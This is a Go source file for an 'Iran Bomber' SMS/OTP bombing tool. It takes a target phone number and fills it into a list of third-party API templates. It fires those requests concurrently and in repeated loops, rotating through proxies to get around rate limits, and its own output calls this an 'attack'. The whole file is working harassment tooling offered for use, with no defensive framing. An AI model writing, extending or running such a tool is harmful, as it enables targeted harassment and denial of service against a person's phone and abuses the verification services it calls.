
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"text/template"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"
)

// ===== TYPES & ANSI COLORS =====
const (
	ColorGreen  = "\033[92m"
	ColorYellow = "\033[93m"
	ColorRed    = "\033[91m"
	ColorBlue   = "\033[94m"
	ColorCyan   = "\033[36m" 
	ColorGray   = "\033[90m" 
	ColorReset  = "\033[0m"
)

type API struct {
	Type    string `json:"Type"`
	Request struct {
		URL     string         `json:"URL"`
		Method  string         `json:"Method"`
		Payload map[string]any `json:"Payload"`
		Headers map[string]any `json:"Headers"`
	} `json:"Request"`
}

type Bomber struct {
	clients      []*fasthttp.Client
	clientIndex  atomic.Uint64
	apiTemplates []API
	stats        struct {
		success int32 // Use atomic for thread-safe increments
		failed  int32
		total   int
	}
}

// ===== CORE BUSINESS LOGIC =====

func NewBomber(apis []API, proxies []string) (*Bomber, error) {
	var clients []*fasthttp.Client
	if len(proxies) > 0 {
		for _, proxy := range proxies {
			client := &fasthttp.Client{
				Name:            "GoBomber/5.0",
				MaxConnsPerHost: 20,
				ReadTimeout:     20 * time.Second,
				WriteTimeout:    20 * time.Second,
			}
			switch {
			case strings.HasPrefix(proxy, "socks5://"):
				client.Dial = fasthttpproxy.FasthttpSocksDialer(proxy)
			case strings.HasPrefix(proxy, "http://"), strings.HasPrefix(proxy, "https://"):
				client.Dial = fasthttpproxy.FasthttpHTTPDialer(proxy)
			default:
				log.Printf("%s[WARN] Skipping invalid proxy format: %s%s", ColorYellow, proxy, ColorReset)
				continue
			}
			clients = append(clients, client)
		}
	}

	clients = append(clients, &fasthttp.Client{
		Name:            "GoBomber/5.0-Direct",
		MaxConnsPerHost: 200,
		ReadTimeout:     15 * time.Second,
		WriteTimeout:    15 * time.Second,
	})

	// Set up the logger to only print the message, without timestamp or prefixes.
	log.SetFlags(0)

	return &Bomber{clients: clients, apiTemplates: apis}, nil
}

func (b *Bomber) getNextClient() *fasthttp.Client {
	idx := b.clientIndex.Add(1) - 1
	return b.clients[int(idx%uint64(len(b.clients)))]
}

func (b *Bomber) requestAPI(_ context.Context, apiTemplate API, phoneNumber string) {
	// ARCHITECT'S NOTE: This function no longer returns an error.
	// It now handles its own logging directly for immediate feedback.
	// This is a design choice for CLI tools where real-time output is prioritized.
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	reqData := apiTemplate.Request
	finalURL := strings.ReplaceAll(reqData.URL, "{{num}}", phoneNumber)
	req.SetRequestURI(finalURL)
	req.Header.SetMethod(reqData.Method)

	for key, value := range reqData.Headers {
		req.Header.Set(key, fmt.Sprintf("%v", value))
	}

	if len(reqData.Payload) > 0 {
		req.Header.SetContentType("application/json")
		finalPayload := make(map[string]any)
		for k, v := range reqData.Payload {
			if strVal, ok := v.(string); ok {
				finalPayload[k] = strings.ReplaceAll(strVal, "{{num}}", phoneNumber)
			} else {
				finalPayload[k] = v
			}
		}
		bodyBytes, _ := json.Marshal(finalPayload)
		req.SetBody(bodyBytes)
	}

	client := b.getNextClient()
	err := client.DoTimeout(req, resp, 20*time.Second)

	// --- REAL-TIME LOGGING LOGIC ---
	if err != nil {
		atomic.AddInt32(&b.stats.failed, 1)
		log.Printf("%s[ FAILED ]%s %-60s %s(Error: %v)%s",
			ColorRed, ColorReset, apiTemplate.Request.URL, ColorRed, err, ColorReset)
		return
	}

	statusCode := resp.StatusCode()
	if statusCode >= 200 && statusCode < 300 {
		atomic.AddInt32(&b.stats.success, 1)
		log.Printf("%s[ SUCCESS ]%s %-60s %s(Status: %d)%s",
			ColorGreen, ColorReset, apiTemplate.Request.URL, ColorGreen, statusCode, ColorReset)
	} else {
		atomic.AddInt32(&b.stats.failed, 1)
		log.Printf("%s[ FAILED ]%s %-60s %s(Status: %d)%s",
			ColorRed, ColorReset, apiTemplate.Request.URL, ColorRed, statusCode, ColorReset)
	}
}

// SendRequests is now much simpler. It just starts the goroutines.
func (b *Bomber) SendRequests(phoneNumber string, concurrency int) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)
	b.stats.total = len(b.apiTemplates)

	fmt.Printf("%s[INFO]%s Starting attack on %s%s%s with %d concurrent workers for %d APIs.%s\n\n",
		ColorGreen, ColorYellow, ColorGreen, phoneNumber, ColorYellow, concurrency, b.stats.total, ColorReset)

	for _, api := range b.apiTemplates {
		wg.Add(1)
		go func(api API) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			ctx, cancel := context.WithTimeout(context.Background(), 25*time.Second)
			defer cancel()
			b.requestAPI(ctx, api, phoneNumber)
		}(api)
	}
	wg.Wait() // Wait for all goroutines to complete
}

// ===== UTILITY & UI FUNCTIONS =====

func loadProxies(filePath, url string) ([]string, error) {
	if filePath == "" && url == "" {
		return nil, nil
	}
	var proxySource io.Reader
	var sourceName string
	if filePath != "" {
		sourceName = filePath
		file, err := os.Open(filePath)
		if err != nil {
			return nil, fmt.Errorf("could not open proxy file '%s': %w", filePath, err)
		}
		defer file.Close()
		proxySource = file
	} else {
		sourceName = url
		fmt.Printf("%s[INFO] Fetching proxies from %s%s%s...%s\n", ColorYellow, ColorGreen, url, ColorYellow, ColorReset)
		resp, err := http.Get(url)
		if err != nil {
			return nil, fmt.Errorf("could not fetch proxy URL '%s': %w", url, err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			return nil, fmt.Errorf("bad status from proxy URL '%s': %s", url, resp.Status)
		}
		proxySource = resp.Body
	}
	var proxies []string
	scanner := bufio.NewScanner(proxySource)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxies from '%s': %w", sourceName, err)
	}
	if len(proxies) == 0 {
		return nil, fmt.Errorf("no valid proxies found in '%s'", sourceName)
	}
	return proxies, nil
}

func IsHTTPURL(s string) bool {
	u, err := url.Parse(s)
	if err != nil {
		return false
	}
	if u.Scheme == "" || u.Host == "" {
		return false
	}
	return strings.EqualFold(u.Scheme, "http") || strings.EqualFold(u.Scheme, "https")
}


func loadAndFilterAPIs(filePathOrUrl, filterURL string, phoneNumber string) ([]API, error) {
	var fileBytes []byte

	fmt.Printf("%s[INFO]%s Loading API List from: %s'%s%s%s'%s\n", ColorGreen, ColorYellow, ColorRed, ColorReset, filePathOrUrl, ColorRed, ColorReset)

	if IsHTTPURL(filePathOrUrl) {
		resp, err := http.Get(filePathOrUrl)
		if err != nil {
			return nil, fmt.Errorf("failed to load API file from url: '%s': %w", filePathOrUrl, err)
		}
		defer resp.Body.Close()
		fileBytes, _ = io.ReadAll(resp.Body)
	} else {
		fpBytes, err := os.ReadFile(filePathOrUrl)
		if err != nil {
			return nil, fmt.Errorf("failed to read API file '%s': %w", filePathOrUrl, err)
		}
		fileBytes = fpBytes
	}
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	replacedBytes := strings.NewReplacer("{{num}}", phoneNumber, "{{random}}", strconv.Itoa(r1.Intn(1000))).
		Replace(string(fileBytes))
	fileBytes = []byte(replacedBytes)
	var allAPIs []API
	if err := json.Unmarshal(fileBytes, &allAPIs); err != nil {
		return nil, fmt.Errorf("failed to parse API definitions: %w", err)
	}
	if filterURL == "" {
		return allAPIs, nil
	}
	var filteredAPIs []API
	for _, api := range allAPIs {
		if strings.Contains(strings.ToLower(api.Request.URL), strings.ToLower(filterURL)) {
			filteredAPIs = append(filteredAPIs, api)
		}
	}
	if len(filteredAPIs) == 0 {
		return nil, fmt.Errorf("no APIs found matching the filter URL: '%s'", filterURL)
	}
	return filteredAPIs, nil
}

func printLogoString() {
	logoTemplate := `

	
                {{.Y}}██{{.G}}╗{{.Y}}██████{{.G}}╗{{.Y}}  █████{{.G}}╗{{.Y}} ███{{.G}}╗{{.Y}}  ██{{.G}}╗{{.Y}}
                ██{{.G}}║{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}████{{.G}}╗ {{.Y}}██{{.G}}║
               {{.Y}} ██{{.G}}║{{.Y}}██████{{.G}}╔╝{{.Y}}███████{{.G}}║{{.Y}}██{{.G}}╔{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}║
                {{.Y}}██{{.G}}║{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}║{{.Y}}██{{.G}}║╚{{.Y}}████{{.G}}║
                {{.Y}}██{{.G}}║{{.Y}}██{{.G}}║  {{.Y}}██{{.G}}║{{.Y}}██{{.G}}║ {{.Y}} ██{{.G}}║{{.Y}}██{{.G}}║ ╚{{.Y}}███{{.G}}║
                ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝
    {{.Y}}██████{{.G}}╗  {{.Y}}█████{{.G}}╗ {{.Y}}███{{.G}}╗   {{.Y}}███{{.G}}╗{{.Y}}██████{{.G}}╗ {{.Y}}███████{{.G}}╗{{.Y}}██████{{.G}}╗ 
    {{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}████{{.G}}╗ {{.Y}}████{{.G}}║{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}╔════╝{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗
    {{.Y}}██████{{.G}}╦╝{{.Y}}██{{.G}}║  {{.Y}}██{{.G}}║{{.Y}}██{{.G}}╔{{.Y}}████{{.G}}╔{{.Y}}██{{.G}}║{{.Y}}██████{{.G}}╦╝{{.Y}}█████{{.G}}╗  {{.Y}}██████{{.G}}╔╝
    {{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}║  {{.Y}}██{{.G}}║{{.Y}}██{{.G}}║╚{{.Y}}██{{.G}}╔╝{{.Y}}██{{.G}}║{{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗{{.Y}}██{{.G}}╔══╝  {{.Y}}██{{.G}}╔══{{.Y}}██{{.G}}╗
    {{.Y}}██████{{.G}}╦╝╚{{.Y}}█████{{.G}}╔╝{{.Y}}██{{.G}}║ ╚═╝ {{.Y}}██{{.G}}║{{.Y}}██████{{.G}}╦╝{{.Y}}███████{{.G}}╗{{.Y}}██{{.G}}║  {{.Y}}██{{.G}}║
    {{.G}}╚═════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝{{.Reset}}
	`
	tmpl := template.Must(template.New("logo").Parse(logoTemplate))
	data := map[string]string{"Y": ColorYellow, "G": ColorGreen, "Reset": ColorReset}
	tmpl.Execute(os.Stdout, data)
	fmt.Println()
}
func clearConsole() {
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	default: // linux, darwin, ...
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func (b *Bomber) printSummary() {
	fmt.Printf("\n%s--- Attack Summary ---%s\n", ColorBlue, ColorReset)
	fmt.Printf("Total Requests Sent:   %d\n", b.stats.total)
	fmt.Printf("%sSuccessful Requests:     %d%s\n", ColorGreen, atomic.LoadInt32(&b.stats.success), ColorReset)
	fmt.Printf("%sFailed Requests:         %d%s\n", ColorRed, atomic.LoadInt32(&b.stats.failed), ColorReset)
	fmt.Printf("%s--------------------%s\n", ColorBlue, ColorReset)
}

// ===== APPLICATION ENTRY POINT =====

func getInput(prompt string, checker func(string) bool) string {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(prompt)
		txt, err := reader.ReadString('\n')
		if err != nil {
			// if reading fails, try again
			fmt.Println("failed reading input, try again")
			continue
		}
		txt = strings.TrimSpace(txt)
		if checker(txt) {
			return txt
		}
		// invalid -> show a small hint and re-prompt
		fmt.Printf("%sInvalid input — please try again.%s\n", ColorRed, ColorReset)
	}
}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}



func main() {
	clearConsole()
	printLogoString()

	phone := flag.String("phone", "", "Target phone number (Required)")
	concurrency := flag.Int("c", 100, "Number of concurrent requests")
	apiFile := flag.String("api", "api.json", "Path to the API JSON file or a URL")
	filterURL := flag.String("url", "", "Optional: Filter APIs by URL")
	proxyFile := flag.String("proxy-file", "", "Optional: Path to a file with proxies (one per line)")
	proxyURL := flag.String("proxy-url", "", "Optional: URL to a list of proxies (one per line)")
	loopCount := flag.Int("loop", 3, "How many times the attack repeates")
	flag.Parse()

	if *phone == "" {
		phonePrompt := fmt.Sprintf("%s[=]%s Enter the phone number %s[9xxxxxxxxx]%s: %s",
			ColorCyan, ColorGray, ColorCyan, ColorGray, ColorGreen)

		*phone = getInput(phonePrompt, func(x string) bool {
			return x != "" && isNumeric(x) && strings.HasPrefix(x, "9") && len(x) == 10
		})

		loopPrompt := fmt.Sprintf("%s[=]%s Enter loop count (default %d, press Enter to keep): %s",
			ColorCyan, ColorGray, *loopCount, ColorGreen)

		loopStr := getInput(loopPrompt, func(x string) bool {
			if x == "" { // accept empty -> keep default
				return true
			}
			if !isNumeric(x) {
				return false
			}
			n, err := strconv.Atoi(x)
			return err == nil && n > 0
		})

		if loopStr != "" {
			n, _ := strconv.Atoi(loopStr)
			*loopCount = n
		}
	}

	if *proxyFile != "" && *proxyURL != "" {
		log.Fatalf("%s[!] Please provide either -proxy-file or -proxy-url, not both.%s", ColorRed, ColorReset)
	}

	proxies, err := loadProxies(*proxyFile, *proxyURL)
	if err != nil {
		log.Fatalf("%s[!] %v%s", ColorRed, err, ColorReset)
	}

	apis, err := loadAndFilterAPIs(*apiFile, *filterURL, *phone)
	if err != nil {
		log.Fatalf("%s[!] %v%s", ColorRed, err, ColorReset)
	}

	bomber, err := NewBomber(apis, proxies)
	if err != nil {
		log.Fatalf("%s[!] Failed to initialize bomber: %v%s", ColorRed, err, ColorReset)
	}

	for i := 0; i < *loopCount; i++ {
		bomber.SendRequests(*phone, *concurrency)
	}
	bomber.printSummary()
}
